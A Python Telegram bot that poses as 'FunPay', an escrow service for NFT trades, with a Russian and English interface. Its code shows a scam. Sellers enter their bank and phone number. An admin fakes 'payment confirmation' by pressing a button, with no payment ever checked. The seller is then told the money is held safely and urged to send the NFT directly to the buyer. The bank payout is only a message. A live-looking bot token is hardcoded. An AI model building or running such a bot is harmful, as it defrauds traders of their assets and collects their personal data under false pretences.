import asyncio
import logging
import random
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
ADMIN_ID = 7532797597  
SUPPORT_LINK = "https://t.me/FunPayHelperRU"
# ============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

users_db = {}      
active_deals = {}  

class CreateDeal(StatesGroup):
    bank = State()
    phone = State()
    amount = State()
    nft_link = State()

def gen_id():
    return f"FUN-{random.randint(1000, 9999)}"

# --- ГЛАВНОЕ МЕНЮ ---
def main_menu(user_id):
    lang = users_db.get(user_id, {}).get("lang", "RU")
    if lang == "RU":
        kb = [
            [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="create_deal")],
            [InlineKeyboardButton(text="📦 Мои сделки", callback_data="my_deals"),
             InlineKeyboardButton(text="💳 Реквизиты", callback_data="my_details")],
            [InlineKeyboardButton(text="🌐 Язык", callback_data="change_lang"),
             InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
        ]
    else:
        kb = [
            [InlineKeyboardButton(text="🤝 Create deal", callback_data="create_deal")],
            [InlineKeyboardButton(text="📦 My deals", callback_data="my_deals"),
             InlineKeyboardButton(text="💳 Details", callback_data="my_details")],
            [InlineKeyboardButton(text="🌐 Language", callback_data="change_lang"),
             InlineKeyboardButton(text="🆘 Support", callback_data="support")]
        ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

async def send_main_menu(message: Message):
    uid = message.chat.id if not message.from_user else message.from_user.id
    if uid not in users_db:
        users_db[uid] = {"lang": "RU", "bank": None, "phone": None}
    lang = users_db[uid]["lang"]
    
    if lang == "RU":
        text = (
            "Добро пожаловать 👋\n\n"
            "🛡 FunPay — Мы специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
            "✨ Автоматизированный алгоритм исполнения.\n"
            "⚡ Скорость и автоматизация.\n"
            "📊 Удобный и быстрый вывод средств.\n\n"
            "▪️ Комиссия сервиса: 3%\n"
            "▪️ Режим работы: 24/7\n"
            "▪️ Техническая поддержка: @FunPayHelperRU\n\n"
            "👇 Выберите нужный раздел ниже:"
        )
    else:
        text = (
            "Welcome 👋\n\n"
            "🛡 FunPay — We are a specialized service for ensuring the security of OTC transactions.\n\n"
            "✨ Automated execution algorithm.\n"
            "⚡ Speed and automation.\n"
            "📊 Convenient and fast withdrawal.\n\n"
            "▪️ Service commission: 3%\n"
            "▪️ Operating mode: 24/7\n"
            "▪️ Support: @FunPayHelperRU\n\n"
            "👇 Choose the required section below:"
        )
    
    await message.answer_photo(
        photo="AgACAgIAAxkBAAEDIx1q825ucePNRzdgkIAGbyBxZMNAdAACxyFrG23gmUtey3umHg-B8gEAAwIAA3MAAz0E",
        caption=text,
        parse_mode="HTML",
        reply_markup=main_menu(uid)
    )

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await send_main_menu(message)

# --- ЯЗЫК ---
@dp.callback_query(F.data == "change_lang")
async def change_lang(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_RU"),
         InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_EN")]
    ])
    await call.message.edit_reply_markup(reply_markup=kb)
    await call.answer()

@dp.callback_query(F.data.startswith("set_lang_"))
async def set_lang(call: CallbackQuery):
    lang = call.data.split("_")[2]
    users_db[call.from_user.id]["lang"] = lang
    await call.message.delete()
    await send_main_menu(call.message)
    await call.answer(f"Язык изменен на {lang}")

# --- ПОДДЕРЖКА ---
@dp.callback_query(F.data == "support")
async def support(call: CallbackQuery):
    await call.message.answer(f"🆘 <b>Техническая поддержка</b>\n\nНапишите нам: {SUPPORT_LINK}", parse_mode="HTML")
    await call.answer()

# --- МОИ СДЕЛКИ ---
@dp.callback_query(F.data == "my_deals")
async def my_deals(call: CallbackQuery):
    user_deals = [d for d in active_deals.values() if d["seller_id"] == call.from_user.id or d["buyer_id"] == call.from_user.id]
    if not user_deals:
        return await call.answer("У вас пока нет сделок.", show_alert=True)
    text = "<b>📦 Ваши сделки:</b>\n\n"
    for d in reversed(user_deals):
        text += f"🆔 {d['id']} | {d['amount']} RUB | Статус: {d['status']}\n"
    await call.message.answer(text, parse_mode="HTML")
    await call.answer()

# --- РЕКВИЗИТЫ ---
@dp.callback_query(F.data == "my_details")
async def my_details(call: CallbackQuery):
    user = users_db.get(call.from_user.id)
    if user["bank"]:
        await call.message.answer(f"💳 <b>Ваши реквизиты:</b>\n🏦 {user['bank']}\n📱 {user['phone']}", parse_mode="HTML")
    else:
        await call.message.answer("У вас нет сохраненных реквизитов.")
    await call.answer()

# --- 1. СОЗДАНИЕ СДЕЛКИ ---
@dp.callback_query(F.data == "create_deal")
async def create_deal(call: CallbackQuery, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 Сбербанк", callback_data="bank_Сбербанк"),
         InlineKeyboardButton(text="🟡 Т-Банк", callback_data="bank_Т-Банк")],
        [InlineKeyboardButton(text="🔵 Альфа-Банк", callback_data="bank_Альфа-Банк"),
         InlineKeyboardButton(text="🟣 ВТБ", callback_data="bank_ВТБ")],
        [InlineKeyboardButton(text="⚫ Другой банк", callback_data="bank_Другой")]
    ])
    await call.message.answer("🏦 <b>Выберите ваш банк:</b>", parse_mode="HTML", reply_markup=kb)
    await state.set_state(CreateDeal.bank)
    await call.answer()

@dp.callback_query(F.data.startswith("bank_"), CreateDeal.bank)
async def process_bank_choice(call: CallbackQuery, state: FSMContext):
    bank = call.data.split("_")[1]
    if bank == "Другой":
        await call.message.edit_text("🏦 Введите название вашего банка текстом:")
    else:
        await state.update_data(bank=bank)
        await call.message.edit_text(f"✅ Выбран банк: {bank}\n\n📱 Введите номер телефона:")
        await state.set_state(CreateDeal.phone)
    await call.answer()

@dp.message(CreateDeal.bank)
async def process_custom_bank(message: Message, state: FSMContext):
    await state.update_data(bank=message.text)
    await message.answer("📱 Введите номер телефона:")
    await state.set_state(CreateDeal.phone)

@dp.message(CreateDeal.phone)
async def process_phone(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    data = await state.get_data()
    users_db[message.from_user.id]["bank"] = data.get("bank")
    users_db[message.from_user.id]["phone"] = data.get("phone")
    await message.answer("💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
    await state.set_state(CreateDeal.amount)

@dp.message(CreateDeal.amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
    except:
        return await message.answer("❌ Введите целое число.")
    await state.update_data(amount=amount)
    await message.answer("🖼 <b>Отправьте ссылку на NFT:</b>", parse_mode="HTML")
    await state.set_state(CreateDeal.nft_link)

@dp.message(CreateDeal.nft_link)
async def process_nft(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    msg = await message.answer("⏳ <i>Создание безопасной сделки...</i>", parse_mode="HTML")
    await asyncio.sleep(1.5)
    
    d_id = gen_id()
    active_deals[d_id] = {
        "id": d_id, "seller_id": message.from_user.id, "seller_name": message.from_user.first_name,
        "buyer_id": None, "bank_name": data["bank"], "phone": data["phone"],
        "amount": data["amount"], "nft_link": message.text, "status": "open"
    }
    
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=deal_{d_id}"
    
    await msg.edit_text(
        f"✅ <b>Сделка {d_id} успешно создана!</b>\n\n"
        f"📄 <b>Детали сделки:</b>\n"
        f"├ Сумма: <b>{data['amount']} RUB</b>\n"
        f"├ Статус: <i>Ожидает оплаты покупателя</i>\n"
        f"└ Безопасность: <i>Сделка защищена алгоритмом FunPay</i>\n\n"
        f"🔗 <b>Ссылка для покупателя:</b>\n<code>{link}</code>\n\n"
        f"<i>Отправьте эту ссылку покупателю. Как только он перейдет по ней и оплатит, вы получите уведомление.</i>",
        parse_mode="HTML"
    )
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay_{d_id}")]
    ])
    await bot.send_message(ADMIN_ID, f"🛡 НОВАЯ СДЕЛКА\nID: {d_id}\nСумма: {data['amount']} RUB", reply_markup=admin_kb)

# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ ---
@dp.message(Command("start"), F.text.contains("deal_"))
async def buyer_open(message: Message):
    d_id = message.text.split("deal_")[1]
    deal = active_deals.get(d_id)
    if not deal: return await message.answer("❌ Сделка не найдена.")
    deal["buyer_id"] = message.from_user.id
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{d_id}")]])
    await message.answer(f"🛒 <b>Безопасная сделка {d_id}</b>\n\nСумма: {deal['amount']} RUB\nТел: <code>{deal['phone']}</code>", parse_mode="HTML", reply_markup=kb)

# --- 3. ОПЛАТА ---
@dp.callback_query(F.data.startswith("pay_"))
async def buyer_paid(call: CallbackQuery):
    d_id = call.data.split("_")[1]
    deal = active_deals.get(d_id)
    deal["status"] = "awaiting_confirm"
    await call.message.edit_text("⏳ <b>Запрос на проверку транзакции отправлен...</b>", parse_mode="HTML")
    await asyncio.sleep(2)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay_{d_id}")]])
    await bot.send_message(ADMIN_ID, f"🔔 ПОКУПАТЕЛЬ ОПЛАТИЛ\nСделка: {d_id}\nСумма: {deal['amount']} RUB", reply_markup=kb)

# --- 4. ПОДТВЕРЖДЕНИЕ ОПЛАТЫ ---
@dp.callback_query(F.data.startswith("confirm_pay_"))
async def confirm_pay(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⛔ Нет прав.", show_alert=True)
    d_id = call.data.split("_")[2]
    deal = active_deals.get(d_id)
    deal["status"] = "paid"
    
    await call.message.edit_text(f"✅ Оплата по сделке {d_id} подтверждена.")
    
    seller_text = (
        f"✅ <b>Средства по сделке {d_id} получены и зарезервированы!</b>\n\n"
        f"📄 <b>Детали транзакции:</b>\n"
        f"├ Покупатель: @{call.from_user.username}\n"
        f"├ Сумма к зачислению: <b>{deal['amount']} RUB</b>\n"
        f"├ Комиссия сервиса (3%): <i>Удержана автоматически</i>\n"
        f"└ Товар: {deal['nft_link']}\n\n"
        f"Покупатель успешно перевел средства. Деньги находятся на защищенном счете FunPay.\n\n"
        f"<b>Передайте указанный NFT напрямую покупателю.</b> После того как вы передадите подарок, нажмите кнопку ниже. Наш алгоритм проверит передачу, и средства моментально поступят на ваши реквизиты ({deal['bank_name']}).\n\n"
        f"<i>Внимание: не передавайте NFT, пока не убедитесь, что это тот самый покупатель.</i>"
    )
    
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📦 Я передал NFT", callback_data=f"seller_done_{d_id}")]])
    
    try:
        await bot.send_chat_action(chat_id=deal["seller_id"], action="typing")
        await asyncio.sleep(1)
        await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nСредства зарезервированы. Ожидайте получения NFT.", parse_mode="HTML")
    except Exception as e:
        print(f"Ошибка: {e}")

# --- 5. ПЕРЕДАЧА NFT ---
@dp.callback_query(F.data.startswith("seller_done_"))
async def seller_done(call: CallbackQuery):
    d_id = call.data.split("_")[2]
    deal = active_deals.get(d_id)
    deal["status"] = "moderation"
    await call.message.edit_text("⏳ <b>Заявка на завершение сделки принята!</b>\n\nОжидайте проверки модератором.", parse_mode="HTML")
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Подтвердить NFT", callback_data=f"confirm_nft_{d_id}")]])
    await bot.send_message(ADMIN_ID, f"🛡 ПРОДАВЕЦ ПЕРЕДАЛ NFT\nСделка: {d_id}", reply_markup=kb)

# --- 6. ПОДТВЕРЖДЕНИЕ NFT ---
@dp.callback_query(F.data.startswith("confirm_nft_"))
async def confirm_nft(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⛔ Нет прав.", show_alert=True)
    d_id = call.data.split("_")[2]
    deal = active_deals.get(d_id)
    deal["status"] = "completed"
    await call.message.edit_text(f"✅ Сделка {d_id} успешно завершена.")
    try:
        await bot.send_message(deal["seller_id"], f"🎉 <b>Сделка {d_id} завершена!</b>\nСредства зачислены на реквизиты ({deal['bank_name']}).", parse_mode="HTML")
        await bot.send_message(deal["buyer_id"], f"🎉 <b>Сделка {d_id} завершена!</b>\nПроверьте NFT.", parse_mode="HTML")
    except: pass

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
